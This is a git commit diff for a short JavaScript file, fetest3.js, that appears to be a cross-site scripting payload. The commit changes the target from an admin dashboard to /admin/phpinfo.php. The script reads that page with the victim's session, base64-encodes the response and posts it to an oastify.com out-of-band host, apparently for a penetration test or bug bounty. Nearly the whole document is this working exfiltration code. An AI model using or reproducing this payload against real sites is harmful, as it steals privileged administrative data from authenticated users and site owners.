7fcb16266f33853cca73f0b94127be7e50d4118a
hackerwahab <hackertabish786@gmail.com>
2026-02-21 07:26:12 +0500

    Update and rename fetest2.js to fetest3.js

--- fetest3.js
+++ fetest3.js
@@ -1,7 +1,7 @@
 (async()=>{
   var c='zehmmthvqpdrli28nbm14p482z8qwit6i.oastify.com';
   try{
-    var r=await fetch('/admin/dashboard');
+    var r=await fetch('/admin/phpinfo.php');
     var t=await r.text();
     var b=btoa(unescape(encodeURIComponent(t)));
     fetch('//'+c,{method:'POST',body:b,mode:'no-cors'});
